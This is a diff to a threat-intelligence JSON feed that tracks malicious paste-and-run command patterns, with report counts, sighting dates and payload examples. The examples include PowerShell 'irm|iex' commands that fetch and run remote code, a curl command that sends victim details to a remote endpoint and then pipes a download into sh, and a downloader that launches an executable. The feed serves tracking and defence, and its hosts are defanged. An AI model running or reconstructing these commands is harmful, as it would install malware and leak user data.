@@ -3,10 +3,9 @@
     "Pattern": "irm '<URL>'|iex;",
     "DistinctPayloadCount": 107,
     "ReportCount": 107,
-    "FirstSeen": "2026-11-11T01:18:52.837000+00:00",
-    "LastSeen": "2026-11-18T00:49:20.146000+00:00",
+    "FirstSeen": "2026-11-11T02:00:11.861000+00:00",
+    "LastSeen": "2026-11-18T01:02:55.695000+00:00",
     "ReportIds": [
-      "cmwbfkpep06i70nml6przoq86",
       "cmwbh1u7y075t0nmludx2sjsg",
       "cmwbij7ph07xp0nmlf5p7gu3z",
       "cmwbikra7080d0nmljddiidby",
@@ -112,7 +111,8 @@
       "cmwkxa7s51h0n0oml0o4c58dz",
       "cmwl6e29x1ho90oml4soletk3",
       "cmwl6sv421hpq0omls4ocdb1w",
-      "cmwlelo8a1i9h0omltrse0fps"
+      "cmwlelo8a1i9h0omltrse0fps",
+      "cmwlf35i01ikh0omllasbe9x1"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -129,6 +129,7 @@
       "irm 'browse-cloud.codes/30a71a2fdd245a54'|iex;",
       "irm 'browse-cloud.codes/31da5fb51a18eaa6'|iex;",
       "irm 'browse-cloud.codes/32e494b8378e3441'|iex;",
+      "irm 'browse-cloud.codes/354fef1345fed255'|iex;",
       "irm 'browse-cloud.codes/3a41d09dfc9da7df'|iex;",
       "irm 'browse-cloud.codes/3d88e2e0aa08ee9b'|iex;",
       "irm 'browse-cloud.codes/404f8b939dce2afe'|iex;",
@@ -218,7 +219,6 @@
       "irm 'browse-nnccodes.beer/c29bf32503634b69'|iex;",
       "irm 'browse-nnccodes.beer/c5edc53c54b52bdf'|iex;",
       "irm 'browse-nnccodes.beer/cefc867900442c97'|iex;",
-      "irm 'browse-nnccodes.beer/d6635ac514ec3dc5'|iex;",
       "irm 'browse-nnccodes.beer/e0f433c5355ab6b9'|iex;",
       "irm 'browse-nnccodes.beer/eda44de7cd33aa18'|iex;",
       "irm 'browse-nnccodes.beer/f5e3d430790185d2'|iex;"
@@ -226,12 +226,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 53,
-    "ReportCount": 53,
-    "FirstSeen": "2026-11-11T01:02:03.343000+00:00",
+    "DistinctPayloadCount": 52,
+    "ReportCount": 52,
+    "FirstSeen": "2026-11-11T09:38:34.916000+00:00",
     "LastSeen": "2026-11-17T16:39:56.362000+00:00",
     "ReportIds": [
-      "cmwbez2fg06ao0nmlov0j0g7o",
       "cmwbxfbop01t80omlciyjaavv",
       "cmwbxk7wd020h0omlqgstyvvt",
       "cmwbxycow02du0omlmyorrq8u",
@@ -337,16 +336,15 @@
       "curl -sL -d \"id=ce23b1b3-0f76-4be3-b79a-d8fc0016875a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Freneesolomon[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-12T19%3A59%3A11.299Z&lastShellAt=2026-11-12T19%3A59%3A11.299Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=d6e95a0f-6d85-4143-a3ea-7a5e7376d2ec&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]zavorky[.]cz%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A43%3A43.306Z&lastShellAt=2026-11-16T04%3A43%3A43.306Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=dc020fc6-fc17-4dc6-a93b-35f429c1aa3c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcameronchetty.co.za%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A40%3A57.802Z&lastShellAt=2026-11-11T09%3A40%3A57.802Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=e061325d-e3f5-4bf4-b562-31a09ea854b9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcofeservice[.]ru%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T01%3A00%3A40.345Z&lastShellAt=2026-11-11T01%3A00%3A40.345Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=f3fa0c1a-7e0e-48b4-b932-1a798360dc9c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbharquitetura[.]com[.]br%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T11%3A47%3A52.597Z&lastShellAt=2026-11-11T11%3A47%3A52.597Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
     ]
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 46,
-    "ReportCount": 46,
+    "DistinctPayloadCount": 49,
+    "ReportCount": 49,
     "FirstSeen": "2026-11-11T02:01:20.426000+00:00",
-    "LastSeen": "2026-11-18T00:50:05.813000+00:00",
+    "LastSeen": "2026-11-18T01:15:32.751000+00:00",
     "ReportIds": [
       "cmwbh3b4i077j0nmlsxo3diav",
       "cmwbxbkvs01oy0oml0eghrrje",
@@ -393,7 +391,10 @@
       "cmwl83adz1i0h0omllxehsmsy",
       "cmwl8h38l1i1p0omlth5jyprt",
       "cmwl8h9cf1i290omlycfzwhkv",
-      "cmwlemnhr1ic60omluyv0dmgc"
+      "cmwlemnhr1ic60omluyv0dmgc",
+      "cmwlfivnr1ilb0omlg7jm24vm",
+      "cmwlfj2tz1img0omlarvww2vu",
+      "cmwlfjdna1inz0omlu82l8eee"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -427,14 +428,17 @@
       "(irm 'https://github[.]pw/wp/a99138664d16b6b2')|iex",
       "(irm 'https://github[.]pw/wp/e9e0a4eb0e5a4b04')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/10e3132beb43e46a')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1ab42bce486721d7')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/496d1f744b38ba90')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/55bbcc0972a7f52e')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/562eb1bed330da20')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/7272047baa155f86')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/72f1e6202bcdac15')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/96f5354b102ae253')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b0d3a7cac1560364')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b1509dddd2c35aca')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b4411ae7b7265b4b')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/cd42c370ba111a89')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d286277597a7223c')|iex",
       "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/3a8b7746765169c8')|iex",
@@ -883,6 +887,20 @@
     ],
     "PayloadExamples": [
       "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit"
+    ]
+  },
+  {
+    "Pattern": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-18T01:02:06.654000+00:00",
+    "LastSeen": "2026-11-18T01:02:30.368000+00:00",
+    "ReportIds": [
+      "cmwlf23n91ij10omln7rjkh67",
+      "cmwlf2lxn1ijq0omlk8itykij"
+    ],
+    "PayloadExamples": [
+      "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell..."
     ]
   },
   {
